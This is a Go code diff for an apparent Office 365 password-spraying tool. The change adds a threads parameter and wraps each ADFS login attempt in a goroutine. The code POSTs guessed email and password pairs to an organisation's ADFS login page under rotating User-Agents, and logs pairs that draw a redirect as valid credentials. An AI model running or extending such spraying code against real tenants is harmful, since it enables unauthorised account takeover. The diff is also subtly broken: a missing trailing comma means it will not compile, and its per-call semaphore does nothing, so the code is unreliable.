@@ -11,10 +11,11 @@ import (
 	"strconv"
 	"strings"
 	"time"
+	"sync"
 
 	"github.com/fatih/color"
-	"github.com/securebinary/o365sprayer/o365sprayer/constants"
-	"github.com/securebinary/o365sprayer/o365sprayer/logging"
+	"o365sprayer/constants"
+	"o365sprayer/logging"
 )
 
 func SprayADFSO365(
@@ -24,32 +25,47 @@ func SprayADFSO365(
 	password string,
 	command string,
 	file *os.File,
+	threads int
 ) {
-	adfsLogin := url.Values{}
-	adfsLogin.Add("AuthMethod", "FormsAuthentication")
-	adfsLogin.Add("UserName", email)
-	adfsLogin.Add("Password", password)
-	loginURL := strings.Replace(authURL, "UsErNaMe%40"+domainName, email, 1)
-	client := &http.Client{
-		CheckRedirect: func(req *http.Request, via []*http.Request) error {
-			return http.ErrUseLastResponse
-		}}
-	req, err := http.NewRequest("POST", loginURL, strings.NewReader(adfsLogin.Encode()))
-	req.Header.Add("User-Agent", constants.USER_AGENTS[rand.Intn(len(constants.USER_AGENTS))])
-	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
-	resp, err := client.Do(req)
-	if err != nil {
-		log.Fatalln(err)
-	}
-	defer resp.Body.Close()
-	if resp.StatusCode == 302 {
-		go sprayCounter()
-		color.Green("[+] Valid Credential : " + email + " - " + password)
-		logging.LogSprayedAccount(file, email, password)
-	}
-	if resp.StatusCode != 302 && command == "standalone" {
-		color.Red("[+] Invalid Credential : " + email + " - " + password)
-	}
+	semaphore := make(chan struct{}, threads)
+	var wg sync.WaitGroup
+	semaphore <- struct{}{}
+	wg.Add(1)
+	go func() {
+		defer func() {
+			<-semaphore
+			wg.Done()
+		}()
+
+		adfsLogin := url.Values{}
+		adfsLogin.Add("AuthMethod", "FormsAuthentication")
+		adfsLogin.Add("UserName", email)
+		adfsLogin.Add("Password", password)
+		loginURL := strings.Replace(authURL, "UsErNaMe%40"+domainName, email, 1)
+		client := &http.Client{
+			CheckRedirect: func(req *http.Request, via []*http.Request) error {
+				return http.ErrUseLastResponse
+			}}
+		req, err := http.NewRequest("POST", loginURL, strings.NewReader(adfsLogin.Encode()))
+		req.Header.Add("User-Agent", constants.USER_AGENTS[rand.Intn(len(constants.USER_AGENTS))])
+		req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
+		resp, err := client.Do(req)
+		if err != nil {
+			log.Fatalln(err)
+		}
+		defer resp.Body.Close()
+		if resp.StatusCode == 302 {
+			go sprayCounter()
+			color.Green("[+] Valid Credential : " + email + " - " + password)
+			logging.LogSprayedAccount(file, email, password)
+		}
+		if resp.StatusCode != 302 && command == "standalone" {
+			color.Red("[+] Invalid Credential : " + email + " - " + password)
+		}
+
+	}()
+
+	wg.Wait()
 }
 
 func SprayEmailsADFSO365(
